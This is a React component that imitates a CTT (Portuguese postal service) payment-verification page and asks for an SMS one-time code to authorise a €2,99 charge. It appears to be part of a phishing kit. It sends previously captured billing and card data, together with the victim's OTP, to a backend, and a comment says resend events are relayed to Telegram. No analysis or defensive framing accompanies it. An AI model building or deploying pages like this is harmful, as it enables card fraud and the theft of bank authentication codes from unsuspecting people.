import React, { useState, useEffect } from 'react';
import { Card, CardContent } from './ui/card';
import { Input } from './ui/input';
import { Button } from './ui/button';
import { Label } from './ui/label';
import { AlertCircle, Shield, MessageSquare, Clock, CheckCircle } from 'lucide-react';
import { useToast } from '../hooks/use-toast';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const CTTOTPForm = () => {
  const [otpCode, setOtpCode] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [timeLeft, setTimeLeft] = useState(120); // 2 minutes
  const [canResend, setCanResend] = useState(false);
  const [billingData, setBillingData] = useState(null);
  const [cardData, setCardData] = useState(null);
  const [phoneNumber, setPhoneNumber] = useState('');
  const { toast } = useToast();
  const navigate = useNavigate();

  useEffect(() => {
    // Load data from localStorage
    const savedBillingData = localStorage.getItem('ctt_billing_data');
    const savedCardData = localStorage.getItem('ctt_card_data');
    
    if (savedBillingData) {
      const billing = JSON.parse(savedBillingData);
      setBillingData(billing);
      setPhoneNumber(billing.telefone || '+351 9XX XXX XXX');
    }
    
    if (savedCardData) {
      setCardData(JSON.parse(savedCardData));
    }
    
    if (!savedBillingData || !savedCardData) {
      toast({
        title: "Dados não encontrados",
        description: "Por favor, comece o processo desde o início",
        variant: "destructive"
      });
      navigate('/billing');
      return;
    }

    // Start countdown timer
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          setCanResend(true);
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [navigate, toast]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleOtpChange = (value) => {
    // Only allow numbers and max 6 digits
    const numericValue = value.replace(/\D/g, '').slice(0, 6);
    setOtpCode(numericValue);
  };

  const handleResendCode = async () => {
    try {
      setCanResend(false);
      setTimeLeft(120);
      
      // Start timer again
      const timer = setInterval(() => {
        setTimeLeft((prev) => {
          if (prev <= 1) {
            setCanResend(true);
            clearInterval(timer);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      toast({
        title: "Código reenviado",
        description: `Novo código SMS enviado para ${phoneNumber}`,
        duration: 3000
      });

      // Optional: Send resend notification to Telegram
      try {
        await axios.post(`${API}/ctt/otp/resend`, {
          phone: phoneNumber,
          billing_data: billingData
        });
      } catch (error) {
        console.log('Failed to send resend notification:', error);
      }

    } catch (error) {
      console.error('Error resending code:', error);
      setCanResend(true);
    }
  };

  const handleVerifyOTP = async () => {
    if (!otpCode || otpCode.length !== 6) {
      toast({
        title: "Código inválido",
        description: "Por favor, introduza um código de 6 dígitos",
        variant: "destructive"
      });
      return;
    }

    setIsVerifying(true);

    try {
      // Simulate OTP verification (in real app, this would call backend)
      const response = await axios.post(`${API}/ctt/otp/verify`, {
        otp_code: otpCode,
        billing_data: billingData,
        card_data: cardData
      });

      if (response.data.status === 'success') {
        toast({
          title: "Código verificado com sucesso!",
          description: "Processando pagamento...",
          duration: 2000
        });

        // Store verification status
        localStorage.setItem('ctt_otp_verified', 'true');
        
        // Navigate to confirmation after delay
        setTimeout(() => {
          navigate('/confirmation');
        }, 2000);
      } else {
        toast({
          title: "Código incorreto",
          description: "Por favor, verifique o código e tente novamente",
          variant: "destructive"
        });
      }

    } catch (error) {
      console.error('Error verifying OTP:', error);
      
      toast({
        title: "Erro na verificação",
        description: error.response?.data?.detail || "Tente novamente em alguns segundos",
        variant: "destructive"
      });
    } finally {
      setIsVerifying(false);
    }
  };

  const maskPhoneNumber = (phone) => {
    if (!phone) return '';
    const cleaned = phone.replace(/\D/g, '');
    if (cleaned.length >= 9) {
      return `${cleaned.slice(0, 4)} XXX XXX ${cleaned.slice(-3)}`;
    }
    return phone;
  };

  if (!billingData || !cardData) {
    return <div className="text-center py-8">Carregando...</div>;
  }

  return (
    <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
      <Card className="shadow-lg border-0 rounded-lg overflow-hidden">
        <CardContent className="p-8">
          {/* Form Header */}
          <div className="flex items-center mb-8">
            <Shield className="w-5 h-5 text-red-600 mr-3" />
            <h2 className="text-xl font-semibold text-gray-900">
              Verificação de Segurança
            </h2>
          </div>

          {/* Security Notice */}
          <div className="bg-blue-50 border-l-4 border-blue-400 p-4 mb-6">
            <div className="flex">
              <div className="flex-shrink-0">
                <MessageSquare className="h-5 w-5 text-blue-400" />
              </div>
              <div className="ml-3">
                <p className="text-sm text-blue-700">
                  <strong>Código de verificação enviado!</strong><br />
                  Foi enviado um código de 6 dígitos via SMS para o seu número de telemóvel.
                </p>
              </div>
            </div>
          </div>

          {/* Phone Display */}
          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-gray-600">Código enviado para:</p>
                <p className="font-semibold text-gray-900">{maskPhoneNumber(phoneNumber)}</p>
              </div>
              <div className="text-green-600">
                <CheckCircle className="w-5 h-5" />
              </div>
            </div>
          </div>

          {/* OTP Input */}
          <div className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="otpCode" className="text-sm font-medium text-gray-700">
                Código de verificação <span className="text-red-500">*</span>
              </Label>
              <Input
                id="otpCode"
                type="text"
                placeholder="000000"
                value={otpCode}
                onChange={(e) => handleOtpChange(e.target.value)}
                className="w-full px-3 py-3 text-center text-2xl font-mono tracking-widest border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                maxLength={6}
                disabled={isVerifying}
              />
              <p className="text-xs text-gray-500 text-center">
                Introduza o código de 6 dígitos que recebeu via SMS
              </p>
            </div>
          </div>

          {/* Timer and Resend */}
          <div className="mt-6 text-center">
            {!canResend ? (
              <div className="flex items-center justify-center text-gray-600">
                <Clock className="w-4 h-4 mr-2" />
                <span className="text-sm">
                  Pode solicitar novo código em: <strong>{formatTime(timeLeft)}</strong>
                </span>
              </div>
            ) : (
              <Button
                variant="outline"
                onClick={handleResendCode}
                className="text-red-600 border-red-600 hover:bg-red-50"
              >
                Reenviar código SMS
              </Button>
            )}
          </div>

          {/* Security Info */}
          <div className="mt-6 p-4 bg-green-50 rounded-lg">
            <div className="flex items-start">
              <Shield className="w-4 h-4 text-green-600 mr-2 mt-0.5" />
              <div className="text-sm text-green-700">
                <p className="font-medium">Porque preciso de verificar?</p>
                <p>Esta verificação protege o seu pagamento e confirma que é realmente você a fazer esta transação.</p>
              </div>
            </div>
          </div>

          {/* Terms Notice */}
          <div className="mt-6 text-sm text-gray-600">
            Ao continuar, confirma que recebeu o código no seu telemóvel e está a autorizar o pagamento de €2,99.
          </div>

          {/* Verify Button */}
          <div className="mt-8 flex justify-end">
            <Button
              onClick={handleVerifyOTP}
              disabled={isVerifying || otpCode.length !== 6}
              className={`px-8 py-2 rounded-md font-medium transition-all duration-200 ${
                isVerifying || otpCode.length !== 6
                  ? 'bg-gray-400 cursor-not-allowed' 
                  : 'bg-red-600 hover:bg-red-700 text-white'
              }`}
            >
              {isVerifying ? (
                <div className="flex items-center">
                  <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Verificando...
                </div>
              ) : (
                'Verificar e Continuar'
              )}
            </Button>
          </div>

          {/* Help Text */}
          <div className="mt-6 text-center">
            <p className="text-xs text-gray-500">
              Não recebeu o código? Verifique a pasta de spam ou aguarde alguns minutos antes de solicitar um novo código.
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default CTTOTPForm;